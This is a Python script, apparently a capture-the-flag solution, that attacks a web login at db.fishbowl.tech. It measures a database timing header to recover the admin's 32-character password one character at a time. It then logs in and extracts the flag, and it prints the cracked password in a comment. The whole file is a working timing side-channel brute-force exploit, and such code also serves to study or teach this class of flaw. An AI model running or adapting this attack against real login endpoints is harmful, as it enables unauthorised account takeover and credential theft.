from requests import post as post_request


def clear():
    from os import system as os_system

    def clear_command(): return os_system('clear')
    clear_command()


def get_ping(data):
    response = post_request(url, data=data, allow_redirects=False)
    ping_time = int(response.headers['x-dbquery-perf'].split('ms')[0])

    return ping_time


def get_base_ping():
    """This check is mandatory to have a ping reference."""

    placeholder = '€'*32
    data = {
        'username': 'admin',
        'password': placeholder
    }

    base_ping = get_ping(data)

    return base_ping


def get_password():
    # A valid char which is not in the password to maintain efficency.
    placeholder = '€'*32
    password = ''

    for pass_char in range(0, 32):
        base_ping = get_base_ping()

        # 1114112 or 0x110000 is the range of chr().
        for ascii_code in range(32, 1114112):
            data = {
                'username': 'admin',
                'password': placeholder[:pass_char] + chr(ascii_code) + placeholder[pass_char+1:]
            }

            ping_time = get_ping(data)

            clear()
            print('Trying the char {0} in password {1}'.format(chr(ascii_code), password[:pass_char]+chr(ascii_code)+placeholder[pass_char+1:]))
            print('The ping time is: {0}'.format(ping_time))

            if ping_time > base_ping+130:
                # Checking if the requests takes longer. If that is the
                # case then the character was found.

                ping_time = get_ping(data)

                if ping_time > base_ping+130:
                    # Validating the request once again because it could happen
                    # that the ping is 'polluted' by the databese's or my ping.

                    print('The char at place {0} was found! It is: {1}'.format(password, chr(ascii_code)))
                    password = password[:pass_char] + chr(ascii_code) + password[pass_char + 1:]
                    break

    print('Password found! It is {0}'.format(password))

    return password


def parse_flag(source_code):
    # Alternative usage:
    # flag = source_code.split("<pre>")[1].split("</pre>")[0]

    from bs4 import BeautifulSoup

    clear()
    soup = BeautifulSoup(source_code, 'html.parser')

    try:
        flag = soup.find("pre").text
    except AttributeError:
        raise Exception("The password seems to be incorrect or the service is down.")

    print("Found the flag: \n")

    return flag


def get_flag(password):
    if len(password) == 32:
        data = {
            'username': 'admin',
            'password': password
        }
        response = post_request(url, data=data)

        flag = parse_flag(response.text)

        return flag

    else:
        raise Exception('The lenght of your password is {0}. It should be 32.'.format(len(password)))


def main():
    global url
    url = 'https://db.fishbowl.tech/login'

    password = get_password()  # SbdjWUWkqfvu97@c4PRt3Za1w*M*p412
    flag = get_flag(password)

    print(flag)


if __name__ == '__main__':
    main()
